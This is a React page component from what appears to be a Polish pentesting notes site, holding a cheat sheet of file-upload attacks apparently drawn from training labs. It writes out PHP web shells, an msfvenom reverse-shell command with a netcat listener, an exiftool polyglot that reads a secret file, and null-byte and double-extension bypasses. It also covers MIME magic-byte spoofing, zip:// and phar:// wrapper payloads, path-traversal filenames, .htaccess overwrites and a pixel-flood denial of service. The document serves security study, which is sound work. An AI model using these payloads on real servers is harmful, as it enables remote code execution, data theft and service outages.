import { Link } from 'react-router-dom';
import file_upload_identyfication from '../../../assets/file_upload_identyfication.png';
import file_upload_request from '../../../assets/file_upload_request.png';
import file_upload_request_changed from '../../../assets/file_upload_request_changed.png';
import file_upload_fuzz_extenction from '../../../assets/file_upload_fuzz_extenction.png';
import file_upload_fuzz_extenction_result from '../../../assets/file_upload_fuzz_extenction_result.png';
import file_upload_white_list from '../../../assets/file_upload_white_list.png';
import file_upload_mime_example from '../../../assets/file_upload_mime_example.png';
import file_upload_mime_example2 from '../../../assets/file_upload_mime_example2.png';
import file_upload_mime_example3 from '../../../assets/file_upload_mime_example3.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const FileUpload = () => {

    return(
        <section>
            <h1>File upload</h1>
            <p>Identyfikujemy jakie frameworki działają w aplikacji</p>
            <ExampleFrame screen={file_upload_identyfication}/>
            <p>Zatem możemy stworzyć plik <span className='important'>echo '{'<?php echo "Hello HTB";?>'}' {`>`} test.php </span></p>
            <p>Po czym uruchomić plik wchodząc do pliku np: <span className='important'>http://SERVER_IP:PORT/uploads/test.php</span></p>

            <p>Prosty webshell <span className='important'>echo '{"<?php system(`$_REQUEST['cmd']`); ?>"}' {`>`} shell.php </span></p>
            <p className='important'>http://SERVER_IP:PORT/uploads/shell.php?cmd=id</p>

            <hr />

            <details>
            <summary>Reverse shell msfvenom</summary>
                <p className='important'>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw {'>'} reverse.php</p>
                <p>Nasłuchiwanie <span className='important'>nc -lvnp OUR_PORT</span></p>
            </details>

            <hr />

            <details>
            <summary>Wyłączenie walidacji po stronie Frontend</summary>
                <p>W inpucie modyfikujemy DOM (HTML) atrybut accept</p>
                <p className='important'>{'<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">'}</p>
            </details>

            <hr />

            <details>
            <summary>Modyfikacja zapytania Backend</summary>
                <p>Dodajemy zdjęcie i przechwytujemy request w burp</p>
                <ExampleFrame screen={file_upload_request}/>
                <p>W ten sposób możemy teraz zmodyfikować to żądanie, aby spełnić nasze potrzeby, bez ograniczeń związanych z walidacją typu frontonu. Jeśli serwer zaplecza nie zweryfikuje przesłanego typu pliku, teoretycznie powinniśmy być w stanie wysłać dowolny typ pliku/treść i zostanie on przesłany na serwer.</p>
                <p>Dwie ważne części żądania to <span className='important'>nazwa_pliku="HTB.png"</span> i zawartość pliku na końcu żądania. Jeśli zmodyfikujemy nazwę pliku na Shell.php i zmodyfikujemy zawartość do powłoki internetowej, której używaliśmy w poprzedniej sekcji; zamiast obrazu przesyłalibyśmy powłokę internetową PHP.</p>
                <ExampleFrame screen={file_upload_request_changed}/>
                <div className='waring'>
                    <p>Uwaga: Możemy również zmodyfikować <span className='important'>Content-type</span> zawartości przesyłanego pliku, chociaż na tym etapie nie powinno to odgrywać istotnej roli, dlatego pozostawimy go bez modyfikacji.</p>
                </div>
            </details>

            <hr />

            <details>
            <summary>Generalnie istnieją dwie popularne formy sprawdzania poprawności rozszerzenia pliku na zapleczu:</summary>
                <ul>
                    <li>Testowanie na czarnej liście typów
                        <p>Ponadto w ramach walidacji można również sprawdzić typ pliku lub zawartość pliku pod kątem dopasowania typu. Najsłabszą formą sprawdzania poprawności jest sprawdzenie rozszerzenia pliku na czarnej liście rozszerzeń w celu ustalenia, czy żądanie przesyłania powinno zostać zablokowane. </p>
                    </li>
                    <li>Testowanie na białej liście typów</li>
                </ul>

                <div className='waring'>
                    <p>Wskazówka: w powyższym porównaniu uwzględniana jest również <span className='important'>wielkość liter</span> i uwzględniane są tylko rozszerzenia <span className='important'>małymi literami</span>. Na serwerach <span className='important'>Windows</span> w nazwach plików nie jest rozróżniana wielkość liter, więc możemy spróbować przesłać plik php z mieszaną wielkością liter (np. pHp), co może również ominąć czarną listę i nadal powinno być wykonywane jako skrypt PHP.</p>
                </div>
            </details>

            <hr />

            <details>
            <summary>Fuzzing rozszerzenia</summary>
                <p>Można skorzystać z wielu list np:</p>
                <Link to='https://github.com/FilipowiczP/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst'>Lista PHP</Link>
                <Link to='https://github.com/FilipowiczP/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt'>Ogólna lista rozszerzeń</Link>
                <ExampleFrame screen={file_upload_fuzz_extenction}/>
                <ExampleFrame screen={file_upload_fuzz_extenction_result}/>
                <p>W przypadku białej listy otrzymujemy błąd <span className='waring'>Only images are allowed</span></p>
                <ExampleFrame screen={file_upload_white_list}/>
                <p>Wszystkie rozszerzenia PHP zostały zablokowane</p>
            </details>
            
            <hr />

            <details>
            <summary>Usuwanie lub zastępowanie niebezpiecznych rozszerzeń</summary>
            <p>Jeśli ta transformacja nie jest stosowana rekurencyjnie, możesz umieścić zabroniony ciąg znaków w taki sposób, że usunięcie go nadal pozostawi prawidłowe rozszerzenie pliku</p>
            <p>exploit.p.<span className='important'>php</span>hp</p>
            </details>

            <hr />

            <details>
            <summary>Umieszczanie kodu w exif data np komentarz</summary>
                <p>{`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`}</p>
            </details>

            <hr />

            <details>
            <summary>Podwójne rozszerzenie</summary>
                <p>Na przykład, jeśli rozszerzenie <span className='important'>.jpg</span> było dozwolone, możemy dodać je do nazwy przesyłanego pliku i nadal kończyć nazwę pliku na .php (np. <span className='important'>Shell.jpg.php</span>), w takim przypadku powinniśmy przejść test białej listy, jednocześnie przesyłając skrypt PHP, który może wykonać kod PHP</p>
            </details>

            <hr />

            <details>
            <summary>Podwójne odwrócone rozszerzenie</summary>
                <p>W niektórych przypadkach sama funkcja przesyłania plików może nie być podatna na ataki, ale konfiguracja serwera WWW może prowadzić do takiej luki. Na przykład organizacja może korzystać z aplikacji internetowej typu open source, która ma funkcję przesyłania plików. Nawet jeśli funkcja przesyłania plików korzysta ze ścisłego wzorca wyrażenia regularnego, który pasuje tylko do końcowego rozszerzenia nazwy pliku, organizacja może używać niepewnych konfiguracji serwera WWW.
                Na przykład plik <span className='important'>/etc/apache2/mods-enabled/php7.4.conf dla serwera WWW Apache2</span> może zawierać nas</p>
                <div className='waring'>
                    <p>{`<FilesMatch ".+\.ph(ar|p|tml)">`}</p>
                    <p className='tab-1'>{`SetHandler application/x-httpd-php`}</p>
                    <p>{`</FilesMatch>`}</p>
                </div>
                <p>Powyższa konfiguracja pokazuje, w jaki sposób serwer WWW określa, które pliki umożliwiają wykonanie kodu PHP. Określa białą listę ze wzorcem wyrażenia regularnego pasującym do <span className='important'>.phar, .php i .phtml. </span>Jednak ten wzór wyrażenia regularnego może zawierać ten sam błąd, który widzieliśmy wcześniej, jeśli zapomnimy zakończyć go znakiem ($). W takich przypadkach dowolny plik zawierający powyższe rozszerzenia będzie mógł wykonać kod PHP, nawet jeśli nie będzie kończył się rozszerzeniem PHP. Na przykład nazwa pliku (<span className='important'>shell.php.jpg</span>) powinna przejść wcześniejszy test białej listy, ponieważ kończy się na (<span className='important'>.jpg</span>), i będzie mogła wykonać kod PHP z powodu powyższej błędnej konfiguracji, ponieważ zawiera (<span className='important'>.php</span>) w jego imieniu.</p>
            
                <p>metodę ominięcia testu sprawdzającego białą listę poprzez <span className='important'>wstrzykiwanie znaków</span>. Możemy wstawić kilka znaków przed lub po ostatecznym rozszerzeniu, aby aplikacja internetowa błędnie zinterpretowała nazwę pliku i wykonała przesłany plik jako skrypt PHP. Poniżej znajdują się niektóre znaki, które możemy spróbować wstrzyknąć:</p>
                <ul className='important'>
                    <li>%20</li>
                    <li>%0a</li>
                    <li>%00</li>
                    <li>%0d0a</li>
                    <li>/</li>
                    <li>.\</li>
                    <li>.</li>
                    <li>…</li>
                    <li>:</li>
                    <ul>
                        <p>Puste byte skonwertowany null byte oraz dots</p>
                        <li className='important'>xC0 x2E</li>
                        <li className='important'>xC4 xAE</li>
                        <li className='important'>xC0 xAE</li>
                    </ul>
                </ul>
                <p>Każdy znak ma specyficzny przypadek użycia, który może oszukać aplikację internetową w celu błędnej interpretacji rozszerzenia pliku. Na przykład (<span className='important'>shell.php%00.jpg</span>) działa z serwerami PHP w wersji <span className='important'>5.X</span> lub wcześniejszej, ponieważ powoduje, że serwer WWW PHP kończy nazwę pliku po (<span className='important'>%00</span>) i zapisuje go jako (<span className='important'>shell. php</span>), jednocześnie przekazując białą listę. To samo można zastosować w przypadku aplikacji internetowych hostowanych na serwerze Windows, wstawiając dwukropek (<span className='important'>:</span>) przed dozwolonym rozszerzeniem pliku (<span className='important'>np. Shell.aspx:.jpg</span>), co powinno również zapisać plik jako (<span className='important'>shell.aspx</span>). Podobnie każdy z pozostałych znaków ma przypadek użycia, który może pozwolić nam na przesłanie skryptu PHP z pominięciem testu sprawdzającego typ.</p>
            </details>

            <hr />

            <details>
            <summary>Content-Type</summary>
                <Link to='https://github.com/FilipowiczP/SecLists/blob/master/Miscellaneous/Web/content-type.txt'>Lista content-types</Link>
                <div className='waring'>
                    <p>Możemy ją zminiejszyć poprzez wyciągnięcie z niej tylko wyznaczone typy np: <span className='important'>{`cat content-type.txt | grep 'image/' > image-content-types.txt`}</span></p>
                </div>
                <div className='waring'>
                    <p>Uwaga: Żądanie HTTP przesyłania pliku ma dwa nagłówki <span className='important'>Content-Type</span>, jeden dla dołączonego pliku (<span className='important'>na dole</span>) i jeden dla pełnego żądania (<span className='important'>na górze</span>). Zwykle musimy zmodyfikować <span className='important'>nagłówek Content-Type pliku</span>, ale w niektórych przypadkach żądanie będzie zawierać tylko główny nagłówek Content-Type (np. jeśli przesłana treść została wysłana jako dane <span className='important'>POST</span>), w takim przypadku będziemy musieli zmodyfikować <span className='important'>główny nagłówek</span> typu zawartości.</p>
                </div>
            </details>

            <hr />

            <details>
            <summary>MIME-Type. Multipurpose Internet Mail Extensions (MIME)</summary>
                <p>Drugim i bardziej powszechnym typem sprawdzania zawartości pliku jest testowanie typu MIME przesłanego pliku. Wielozadaniowe rozszerzenia poczty internetowej (MIME) to standard internetowy określający typ pliku na podstawie jego ogólnego formatu i struktury bajtów. Zwykle robi się to poprzez sprawdzenie kilku pierwszych bajtów zawartości pliku, które zawierają <Link to='https://en.wikipedia.org/wiki/List_of_file_signatures'>podpis pliku</Link> lub <Link to='https://opensource.apple.com/source/file/file-23/file/magic/magic.mime'>magiczne bajty</Link>. Na przykład, jeśli plik zaczyna się od (GIF87a lub GIF89a), oznacza to, że jest to obraz GIF, podczas gdy plik zaczynający się od zwykłego tekstu jest zwykle uważany za plik tekstowy. Jeśli zmienimy pierwsze bajty dowolnego pliku na magiczne bajty GIF, jego typ MIME zostanie zmieniony na obraz GIF, niezależnie od pozostałej zawartości i rozszerzenia.</p>
                <ExampleFrame screen={file_upload_mime_example}/>
                <p>Jak widzimy, typ <span className='important'>MIME</span> pliku to tekst <span className='important'>ASCII</span>, mimo że jego rozszerzenie to <span className='important'>.jpg</span>. Jeśli jednak na <span className='important'>początku pliku napiszemy GIF8, zostanie on uznany za obraz GIF</span>, mimo że jego rozszerzenie to nadal .jpg:</p>
                <ExampleFrame screen={file_upload_mime_example2}/>
                <p>Po przekazaniu naszej prośby zauważamy, że pojawia się komunikat o błędzie. <span className='important'>Only images are allowed</span>. Teraz spróbujmy dodać <span className='important'>GIF8</span> przed naszym kodem PHP, aby spróbować imitować obraz GIF, zachowując jednocześnie rozszerzenie pliku <span className='important'>.php</span></p>
                <ExampleFrame screen={file_upload_mime_example3}/>
                <div className='waring'>
                    <p>Uwaga: widzimy, że wyjście polecenia zaczyna się od <span className='important'>GIF8</span> , ponieważ była to pierwsza linia naszego skryptu PHP imitująca magiczne bajty GIF, a teraz jest wyświetlana jako zwykły tekst przed wykonaniem naszego kodu PHP.</p>
                </div>
                <div className='waring'>
                    <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>./profile_images/shell.gif&cmd=id</span></p>
                </div>
            </details>

            <hr />

            <h3><Link to='/xss'>Zaszywanie XSS w plikach</Link></h3>
            
            <hr />
            
            <h3><Link to='/xxe'>Zaszywanie XXE w plikach</Link></h3>

            <hr />

            <details>
            <summary>DoS</summary>
                <p>Możliwym atakiem DoS jest atak <span className='important'>Pixel Flood</span> wykorzystujący niektóre pliki graficzne wykorzystujące kompresję obrazu, takie jak <span className='important'>JPG lub PNG</span>. Możemy utworzyć dowolny plik obrazu JPG o dowolnym rozmiarze (<span className='important'>np. 500x500</span>), a następnie ręcznie zmodyfikować jego dane kompresji, aby powiedzieć, że ma rozmiar (<span className='important'>64250 x 64250</span>)(<span className='important'>0xffff x 0xffff</span>), co daje obraz o postrzeganym rozmiarze <span className='error'>4 Gigapikseli</span>. Gdy aplikacja internetowa spróbuje wyświetlić obraz, podejmie próbę przydzielenia całej swojej pamięci temu obrazowi, co spowoduje awarię serwera zaplecza.</p>
            </details>
        
            <hr />

            <details>
            <summary>Zip upload</summary>
                <div className='waring'>
                    <p>echo '{`<`}?php system($_GET["cmd"]); ?{`>`}' {`>`} shell.php <span className='important'>&& zip shell.jpg shell.php</span></p>
                </div>

                <div className='waring'>
                    <p>Uwaga: mimo że nazwaliśmy nasze archiwum <span className='important'>ZIP</span> jako (<span className='important'>shell.jpg</span>), niektóre formularze przesyłania mogą w dalszym ciągu wykrywać nasz plik jako archiwum ZIP poprzez testy typu zawartości i uniemożliwiać jego przesyłanie, więc ten <span className='important'>atak ma większą szansę zadziałać, jeśli przesyłanie archiwów zip jest dozwolone.</span></p>
                </div>

                <div className='waring'>
                    <p>Dołączamy je do opakowania ZIP jako (<span className='important'>zip://shell.jpg</span>), a następnie odwołać się do wszystkich znajdujących się w nim plików za pomocą <span className='important'>#shell.php</span> (zakodowany adres URL)</p>
                    <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='error'>zip</span><span className='important'>://./profile_images/shell.jpg%23shell.php&cmd=id</span></p>
                </div>
            </details>

            <hr />

            <details>
            <summary>Phar Upload</summary>
                <div className='waring'>
                    <p>Tworzymy plik shell.php</p>
                    <p>{`<`}?php</p>
                    <p>{`$phar = new Phar('shell.phar');`}</p>
                    <p>{`$phar->startBuffering();`}</p>
                    <p>{`$phar->addFromString('shell.txt', '<`}?php system($_GET["cmd"]); ?{`>`}');</p>
                    <p>{`$phar->setStub('<?php __HALT_COMPILER(); ?>');`}</p>
                    <br />
                    <p>{`$phar->stopBuffering();`}</p>
                </div>

                <p>Skrypt ten można <span className='important'>skompilować do pliku phar</span>, który po wywołaniu zapisuje powłokę internetową do podpliku <span className='important'>Shell.txt</span>, z którym możemy wchodzić w interakcję. Możemy skompilować go do pliku <span className='important'>phar i zmienić jego nazwę na Shell.jpg</span> w następujący sposób:</p>
            
                <div className='waring'>
                    <p>php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg</p>
                </div>

                <p>Teraz powinniśmy mieć plik phar o nazwie <span className='important'>Shell.jpg</span>. Po przesłaniu go do aplikacji internetowej możemy po prostu wywołać go za pomocą <span className='important'>phar://</span> i podać ścieżkę URL, a następnie określić podplik <span className='important'>phar za pomocą /shell.txt</span> (zakodowany adres URL), aby uzyskać dane wyjściowe polecenia, które wykonamy określ za pomocą (&cmd=id) w następujący sposób:</p>

                <div className='waring'>
                    <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='error'>phar</span><span className='important'>://./profile_images/shell.jpg%2Fshell.txt&cmd=id</span></p>
                </div>
            </details>

            <hr />

            <details>
            <summary>Zmiana ścieżki załadowanego pliku</summary>
            <div className='waring'>
                <p>Przygotować plik PHP {`<?php echo file_get_contents('/home/carlos/secret'); ?>`}</p>
                <br />
                <p>filename="..%2fexploit.php"</p>
                <p><span className='important'>The file avatars/../exploit.php has been uploaded.</span></p>
                <p>Plik się wykona pod zapytaniem GET /files/exploit.php, a nie jak normalnie /files/avatar/exploit.php</p>
            </div>
            </details>

            <hr />

            <details>
            <summary>Nadpisanie pliku konfiguracyjnego serwera</summary>
            <div className='waring'>
                <p>zmień nazwę na <span className='important'>filename</span> na <span className='important'>.htaccess (ZALEŻY OD SERVERA!! APACHE itp)</span></p>
                <p>zmień <span className='important'>Content-Type</span> na <span className='important'>text/plain</span></p>
                <p>W pliku powinno być<span className='important'>AddType application/x-httpd-php .l33t</span></p>
                <p>dodając następny plik z injection musimy ustawić <span className='important'>Content-Type application/x-httpd-php</span> oraz <span className='important'>rozszerzenie pliku na .l33t</span></p>
            </div>
              
            </details>
        </section>
    )
};

export default FileUpload;